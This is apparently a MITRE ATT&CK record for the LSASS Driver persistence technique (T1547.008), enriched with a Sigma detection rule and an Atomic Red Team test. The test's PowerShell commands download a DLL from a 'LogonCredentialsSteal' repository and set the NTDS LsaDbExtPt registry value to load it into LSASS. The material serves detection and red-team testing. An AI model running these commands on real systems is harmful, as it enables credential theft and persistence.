{
    "id": "T1547.008",
    "name": "LSASS Driver",
    "description": "Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process. (Citation: Microsoft Security Subsystem)\nAdversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g., [Hijack Execution Flow](T1574)), an adversary can use LSA operations to continuously execute malicious payloads.",
    "platforms": "Windows",
    "kill_chain_phases": "Persistence, Privilege Escalation",
    "data_sources": "Module: Module Load, Driver: Driver Load, File: File Modification, File: File Creation",
    "detection": "With LSA Protection enabled, monitor the event logs (Events 3033 and 3063) for failed attempts to load LSA plug-ins and drivers. (Citation: Microsoft LSA Protection Mar 2014) Also monitor DLL load operations in lsass.exe. (Citation: Microsoft DLL Security)\nUtilize the Sysinternals Autoruns/Autorunsc utility (Citation: TechNet Autoruns) to examine loaded drivers associated with the LSA.",
    "url": "https://attack.mitre.org/techniques/T1547/008",
    "enrichments": {
        "attack_rule_map": [],
        "cycat": {
            "cycat": {
                "cycat_related_uuids": [
                    "b3503044-60ce-4bf4-bbcb-e3db98788823",
                    "f0589bc3-a6ae-425a-a3d5-5659bfee07f4"
                ],
                "lookup_results": [
                    {
                        "uuid": "b3503044-60ce-4bf4-bbcb-e3db98788823",
                        "lookup_data": {
                            "description": "Detects a method to load DLL via LSASS process using an undocumented Registry key",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2019/10/16\ndescription: Detects a method to load DLL via LSASS process using an undocumented\n  Registry key\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_domain_controller:\n    Details:\n    - '%%systemroot%%\\system32\\ntdsa.dll'\n    - '%%systemroot%%\\system32\\lsadb.dll'\n    Image: C:\\Windows\\system32\\lsass.exe\n  selection:\n    TargetObject|contains:\n    - \\CurrentControlSet\\Services\\NTDS\\DirectoryServiceExtPt\n    - \\CurrentControlSet\\Services\\NTDS\\LsaDbExtPt\nfalsepositives:\n- Unknown\nid: b3503044-60ce-4bf4-bbcb-e3db98788823\nlevel: high\nlogsource:\n  category: registry_event\n  product: windows\nmodified: 2022/04/21\nreferences:\n- https://blog.xpnsec.com/exploring-mimikatz-part-1/\n- https://twitter.com/SBousseaden/status/1183745981189427200\nstatus: test\ntags:\n- attack.execution\n- attack.persistence\n- attack.t1547.008\ntitle: DLL Load via LSASS\n",
                            "sigma:id": "b3503044-60ce-4bf4-bbcb-e3db98788823",
                            "title": "DLL Load via LSASS",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "f0589bc3-a6ae-425a-a3d5-5659bfee07f4",
                        "lookup_data": {
                            "mitre-attack-id": "T1547.008",
                            "mitre-cti:description": "Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process.(Citation: Microsoft Security Subsystem)\n\nAdversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g., [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574)), an adversary can use LSA operations to continuously execute malicious payloads.",
                            "mitre-cti:name": "LSASS Driver",
                            "mitre-cti:type": "attack-pattern",
                            "raw": "{'x_mitre_platforms': ['Windows'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['Vincent Le Toux'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'type': 'attack-pattern', 'id': 'attack-pattern--f0589bc3-a6ae-425a-a3d5-5659bfee07f4', 'created': '2020-01-24T18:38:55.801Z', 'x_mitre_version': '1.0', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1547.008', 'url': 'https://attack.mitre.org/techniques/T1547/008'}, {'source_name': 'Microsoft LSA Protection Mar 2014', 'url': 'https://technet.microsoft.com/library/dn408187.aspx', 'description': 'Microsoft. (2014, March 12). Configuring Additional LSA Protection. Retrieved November 27, 2017.'}, {'source_name': 'Microsoft DLL Security', 'url': 'https://msdn.microsoft.com/library/windows/desktop/ff919712.aspx', 'description': 'Microsoft. (n.d.). Dynamic-Link Library Security. Retrieved November 27, 2017.'}, {'source_name': 'Microsoft Security Subsystem', 'url': 'https://technet.microsoft.com/library/cc961760.aspx', 'description': 'Microsoft. (n.d.). Security Subsystem Architecture. Retrieved November 27, 2017.'}, {'source_name': 'TechNet Autoruns', 'url': 'https://technet.microsoft.com/en-us/sysinternals/bb963902', 'description': 'Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.'}], 'x_mitre_deprecated': False, 'revoked': False, 'description': 'Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process.(Citation: Microsoft Security Subsystem)\\n\\nAdversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g., [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574)), an adversary can use LSA operations to continuously execute malicious payloads.', 'modified': '2022-04-20T16:34:43.405Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'name': 'LSASS Driver', 'x_mitre_detection': 'With LSA Protection enabled, monitor the event logs (Events 3033 and 3063) for failed attempts to load LSA plug-ins and drivers. (Citation: Microsoft LSA Protection Mar 2014) Also monitor DLL load operations in lsass.exe. (Citation: Microsoft DLL Security)\\n\\nUtilize the Sysinternals Autoruns/Autorunsc utility (Citation: TechNet Autoruns) to examine loaded drivers associated with the LSA. ', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'privilege-escalation'}], 'x_mitre_is_subtechnique': True, 'x_mitre_data_sources': ['Driver: Driver Load', 'Module: Module Load', 'File: File Creation', 'File: File Modification'], 'x_mitre_permissions_required': ['SYSTEM', 'Administrator'], 'x_mitre_attack_spec_version': '2.1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
                            "_cycat_type": "Item"
                        }
                    }
                ]
            }
        },
        "atomics": [
            {
                "attack_technique": "T1547.008",
                "display_name": "Boot or Logon Autostart Execution: LSASS Driver",
                "atomic_tests": [
                    {
                        "name": "Modify Registry to load Arbitrary DLL into LSASS - LsaDbExtPt",
                        "auto_generated_guid": "8ecef16d-d289-46b4-917b-0dba6dc81cf1",
                        "description": "The following Atomic will modify an undocumented registry key that may be abused to load a arbitrary DLL into LSASS. \n\nUpon execution, the registry key will be modified and a value will contain the path to the DLL. \nReference: https://blog.xpnsec.com/exploring-mimikatz-part-1/ and source https://github.com/oxfemale/LogonCredentialsSteal\nNote that if any LSA based protection is enabled, this will most likely not be successful with LSASS.exe loading the DLL.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "dll_path": {
                                "description": "Module to be loaded into LSASS",
                                "type": "path",
                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\lsass_lib.dll"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "lsass_lib.dll must exist on disk at specified location (#{dll_path})\n",
                                "prereq_command": "if (Test-Path \"#{dll_path}\") {exit 0} else {exit 1}\n",
                                "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/oxfemale/LogonCredentialsSteal/raw/53e74251f397ddeab2bd1348c3ff26d702cfd836/lsass_lib/x64/Release/lsass_lib.dll\" -UseBasicParsing -OutFile \"#{dll_path}\"\n"
                            }
                        ],
                        "executor": {
                            "command": "New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS -Name LsaDbExtPt -Value \"#{dll_path}\"\n",
                            "cleanup_command": "Remove-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS\" -Name \"LsaDbExtPt\" -ErrorAction Ignore | Out-Null\n",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    }
                ]
            }
        ]
    },
    "timestamp": "2025-02-28 15:42:36"
}